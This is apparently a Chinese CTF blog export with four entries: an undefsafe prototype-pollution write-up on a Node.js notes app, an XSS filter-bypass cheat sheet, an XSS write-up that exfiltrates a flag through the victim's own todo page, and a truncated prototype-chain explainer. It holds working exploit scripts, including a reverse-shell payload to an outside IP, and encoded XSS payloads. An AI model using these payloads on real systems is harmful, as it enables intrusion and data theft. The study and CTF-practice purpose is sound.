class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Notes</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">owner</span> = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">num</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span> = &#123;&#125;;    <span class="comment">// 定义了一个字典，在后面的攻击过程中会用到</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">write_note</span>(<span class="params">author, raw_note</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">note_list</span>[(<span class="variable language_">this</span>.<span class="property">num</span>++).<span class="title function_">toString</span>()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        <span class="title function_">undefsafe</span>(r, id, <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit_note</span>(<span class="params">id, author, raw</span>) &#123;</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        <span class="title function_">undefsafe</span>(<span class="variable language_">this</span>.<span class="property">note_list</span>, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">get_all_notes</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">note_list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">remove_note</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">note_list</span>[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> <span class="title class_">Notes</span>();</span><br><span class="line">notes.<span class="title function_">write_note</span>(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);    <span class="comment">// 设置模板引擎为pug</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> raw = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.<span class="title function_">write_note</span>(author, raw);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/edit_note&#x27;</span>)    <span class="comment">// 该路由中 undefsafe 三个参数均可控</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">let</span> author = req.<span class="property">body</span>.<span class="property">author</span>;</span><br><span class="line">        <span class="keyword">let</span> enote = req.<span class="property">body</span>.<span class="property">raw</span>;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.<span class="title function_">edit_note</span>(id, author, enote);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">post</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.<span class="title function_">remove_note</span>(id);</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_all_notes</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.<span class="title function_">get_note</span>(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)    <span class="comment">// 漏洞点，只要将字典 commands 给污染了, 就能任意执行我们的命令</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);    <span class="comment">// 将命令执行结果输出</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">stack</span>);</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><h2 id="为什么不是write-note"><a href="#为什么不是write-note" class="headerlink" title="*为什么不是write_note?"></a>*为什么不是write_note?</h2><ol><li>这里不行，就算传入<code>__proto__</code>也无法污染原型链，而是直接替换对象，只有在<code>undefsafe()</code>中才可以添加属性进行污染</li></ol><h2 id="undefsafe的原型链污染"><a href="#undefsafe的原型链污染" class="headerlink" title="*undefsafe的原型链污染"></a>*undefsafe的原型链污染</h2><ol><li>介绍：Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性</li><li>速记<ol><li>低版本&lt;2.0.3</li><li>undefsafe用来修改&#x2F;添加属性时防止报错</li><li>2.0.3一下如果当属性不存在时，我们想对该属性赋值，访问属性会在上层进行创建并赋值</li></ol></li><li><a href="https://www.anquanke.com/post/id/242645">例子</a></li></ol><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>直接见script</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在wsl中运行即可</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://3f9cde28-54c3-4507-9d88-724e570aee10.node5.buuoj.cn:81&quot;</span></span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:<span class="string">&quot;__proto__.b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/8.218.92.67/8080 0&gt;&amp;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;raw&quot;</span> : <span class="string">&quot;h3110 w0r1d&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r=requests.post(url+<span class="string">&quot;/edit_note&quot;</span>,json=payload,timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r=requests.get(url+<span class="string">&quot;/status&quot;</span>,timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> Node安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss_payload</title>
      <link href="/2024/10/30/xss_payload/"/>
      <url>/2024/10/30/xss_payload/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://xz.aliyun.com/t/12890?time__1311=GqGxuDc7iQGQitD/Y2PBKq2UiA+2AEbD">xss进阶原理</a></li></ol><h2 id="T00ls"><a href="#T00ls" class="headerlink" title="T00ls"></a>T00ls</h2><h2 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h2><ol><li>带外，一般不行不出网</li><li>cookie，需要cookie不是httponly</li><li><strong>写入载体</strong></li></ol><h2 id="关键词黑名单"><a href="#关键词黑名单" class="headerlink" title="关键词黑名单"></a>关键词黑名单</h2><ol><li><p>执行代码<code>window[&#39;eval&#39;](atob(data))</code></p><ol><li>绕过安全检查：有些网站或应用可能会禁用或重写 eval 函数以防止潜在的安全风险。通过使用 <code>window[&#39;eval&#39;]</code>，攻击者可以尝试绕过这种检查</li><li>使用<code>atob(data)</code>进行base64解码</li></ol></li><li><p>实体编码绕过</p><ol><li>可以识别出是<code>data:text/javascript;base64,</code>，有条件还是本地多试试</li><li>详见绕过原理中的<code>html解码和js解码</code></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x2c;</span>YWxlcnQoKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>自动闭合特性：可以用于绕过一些正则表达式</p></li></ol><h2 id="一些绕过原理"><a href="#一些绕过原理" class="headerlink" title="一些绕过原理"></a>一些绕过原理</h2><h3 id="html解码和js解码"><a href="#html解码和js解码" class="headerlink" title="html解码和js解码"></a>html解码和js解码</h3><ol><li>解码顺序<ol><li>一般情况下，解码顺序是按照HTML实体化解码–&gt;JavaScript解码进行的</li></ol></li><li>HTML实体化解码<ol><li>如果服务器与客户端之间要传输某个特殊字符，像是<code>&lt;&gt;，&#39;</code>等这类会被当做标签或者属性值等来解析的字符，为了避免歧义就需要使用到HTML实体化编码来进行编码了。</li><li>HTML编码的几种方式<ol><li>别名形式：因为比较多可以见(w3school.com.cn)</li><li>十六进制：像<code>&lt;div&gt;</code>就会被编码为<code>&amp;#x003c;&amp;#x0064;&amp;#x0069;&amp;#x0076;&amp;#x003e;</code></li><li>十进制：上述标签在十进制会被编码为<code>&amp;#60;&amp;#100;&amp;#105;&amp;#118;&amp;#62;</code></li></ol></li></ol></li><li>为什么需要JavaScript解码？<ol><li>通过JavaScript编码，可以对特殊字符进行转义，防止数据在传输过程中产生语法错误或安全漏洞。例如，对于包含特殊字符（如引号、尖括号等）的数据，可以使用转义字符进行编码，以确保数据的完整性和安全性。</li></ol></li><li><em><strong>明明有了HTML实体化编码为什么是还需要JavaScript编码</strong></em><ol><li><p>在HTML进行解析的时候，遇到了<code>&lt;script&gt;</code>标签或者事件属性或者URL协议时就会使用到JS编码来对JS代码当中的特殊字符如<code>：&#39;，&quot;</code>进行编码操作。</p></li><li><p>JS编码有哪些方式？</p><ol><li>以\uxxxx，\UXXXXXXXX，\xXX都是JavaScript编码</li><li>但是注意：某些特殊字符不能够进行JavaScript编码，否则浏览器无法进行解析，如<code>&lt; &gt; &#39; &quot; ( )</code><ol><li>特别的：<code>&lt;svg&gt;</code>当中包裹的标签将特殊字符进行编码时可以进行解析</li></ol></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=# onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="comment">// js编码后</span></span><br><span class="line">&lt;img src=# onerror=\u0061\u006C\u0065\u0072\u0074(\u0031)&gt;</span><br><span class="line">// 因为()要进行保留，所以不是以下</span><br><span class="line">&lt;img src=# onerror=\u0061\u006C\u0065\u0072\u0074\u0031&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解码脚本如下</span></span><br><span class="line"><span class="comment"># 原始字符串</span></span><br><span class="line">encoded_string = <span class="string">&#x27;&lt;img src=# onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0031)&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 Unicode 转义序列</span></span><br><span class="line">decoded_string = encoded_string.encode().decode(<span class="string">&#x27;unicode-escape&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decoded_string)</span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> payload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web02_网鼎24</title>
      <link href="/2024/10/29/web02_%E7%BD%91%E9%BC%8E24/"/>
      <url>/2024/10/29/web02_%E7%BD%91%E9%BC%8E24/</url>
      
        <content type="html"><![CDATA[<blockquote><p>也是更新我对带外的思考了</p></blockquote><h2 id="越权与带外"><a href="#越权与带外" class="headerlink" title="越权与带外"></a>越权与带外</h2><blockquote><p>没见过这种，开辟新思路了，还是做题不够多</p></blockquote><ol><li>没搞出来，dy牛，分析一下</li><li>第一波的&#x2F;flag纯靠经验猜，砂岩了，不过就算有也想不到这样</li><li>一眼注入回显型，xss和ssti，xss有点希望(boss会看，可以获取他的cookie)，但是bp collaborator和dnslog都不行，应该是不出网，不出网如何获取信息？而且这里&#x2F;flag有访问控制</li><li><em><strong>这里就来到今天的重点了</strong></em><ol><li><p>引入一个<strong>信道概念</strong>，从本质上看与网站交互的信道是单条的，带外是为了自己引进，如果带外不行的话，那如何在单条信道获取信息 -&gt; 对方返回的内容，这里最明显的就是todo，接下来就是要让对方携带cookie返回在todo里面</p></li><li><p><strong>访问控制</strong>: todo可以通过post进行修改，而且注意到每一个content都有一个对于的id -&gt; 通过boss可以访问到&#x2F;flag，然后插入到我的页面</p></li><li><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> url = <span class="string">&quot;...&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(url + <span class="string">&quot;/flag&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(url + <span class="string">&quot;/content/613cdda82446ae4b717db0853d7f6e16&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="string">&quot;&lt;h1&gt;kc1zs4&lt;/h1&gt;&quot;</span> + res,</span></span><br><span class="line"><span class="language-javascript">      &#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;&#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">content_url=<span class="string">&quot;http://0192d6fc41de7e048e7a39db597b5210.g66v.dg01.ciihw.cn:46620/con</span></span><br><span class="line"><span class="string">tent/613cdda82446ae4b717db0853d7f6e16&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;fetch(&#x27;/flag&#x27;).then(res =&gt; &#123;return res.text();&#125;).then(res =&gt;&#123;return fetch(&#x27;/content/613cdda82446ae4b717db0853d7f6e16&#x27;,&#123;method:&#x27;POST&#x27;,headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;content=&lt;br&gt;binbin&lt;br&gt;&#x27;+res,&#125;).then(res =&gt; &#123;&#125;);&#125;);&quot;</span></span><br><span class="line"></span><br><span class="line">payload=base64.b64encode(payload.encode()).decode()</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;content&#x27;</span>:<span class="string">f&quot;&lt;script&gt;window[&#x27;eval&#x27;](atob(&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;));&lt;/script&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res=requests.post(content_url,data=data)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS原型链污染速通</title>
      <link href="/2024/10/28/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/"/>
      <url>/2024/10/28/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="1-DONE-Js中函数也是对象啊，他们的原型链怎么办"><a href="#1-DONE-Js中函数也是对象啊，他们的原型链怎么办" class="headerlink" title="1. DONE: Js中函数也是对象啊，他们的原型链怎么办?"></a>1. DONE: Js中函数也是对象啊，他们的原型链怎么办?</h3><ol><li>对于构造函数，更加准确是使用new调用时，func.prototype才能发挥他特有的作用，否则只是一个普通的属性</li><li><code>Constructor.prototype</code> 仅在构造实例时有用。它与 <code>Constructor.[[Prototype]]</code> 无关，后者是构造函数的自有原型，即 Function.prototype。也就是说，Object.getPrototypeOf(Constructor) &#x3D;&#x3D;&#x3D; Function.prototype</li></ol><h3 id="2-DONE-内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事"><a href="#2-DONE-内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事" class="headerlink" title="*2. DONE: 内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事?"></a>*2. DONE: 内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事?</h3><ol><li><p>默认情况下，构造函数的 prototype 是一个普通的对象，它的<code>[[Prototype]]</code>指向 Object.prototype</p><ol><li>普通对象的 <code>[[Prototype]]</code> 指向 Object.prototype。这是 JavaScript 中原型链机制的一个基本特性。每个通过<em><strong>对象字面量</strong></em>或***new Object()***创建的对象，默认情况下其内部 <code>[[Prototype]]</code>链接（即 <code>__proto__</code>）指向 Object.prototype</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认的调用链</span></span><br><span class="line">obj ---&gt; <span class="title class_">Constructor</span>.<span class="property"><span class="keyword">prototype</span></span> ---&gt; <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> ---&gt; <span class="literal">null</span></span><br><span class="line"><span class="comment">// 可以通过调用链进行解决</span></span><br></pre></td></tr></table></figure></li><li><p>内置构造函数</p><ol><li>一些内置构造函数的 prototype 属性本身就是其自身的实例。例如，Number.prototype 是数字 0，Array.prototype 是一个空数组，RegExp.prototype 是 <code>/(?:)/</code></li><li>唯一的例外是 Object.prototype 本身，它的 <code>[[Prototype]]</code> 是 null</li></ol></li></ol><h3 id="3-DONE-原型指向的对象对于每一个自定义对象都是不同的吗"><a href="#3-DONE-原型指向的对象对于每一个自定义对象都是不同的吗" class="headerlink" title="*3. DONE: 原型指向的对象对于每一个自定义对象都是不同的吗?"></a>*3. DONE: 原型指向的对象对于每一个自定义对象都是不同的吗?</h3><ol><li>构造函数中prototype总是会默认有一个同对象，当你改变构造函数的 prototype 属性后，之前创建的实例和之后创建的实例将有不同的 <code>[[Prototype]]</code>。这是因为每个实例对象的 <code>[[Prototype]]</code> 在创建时就已经被设置，并且不会随着构造函数 prototype 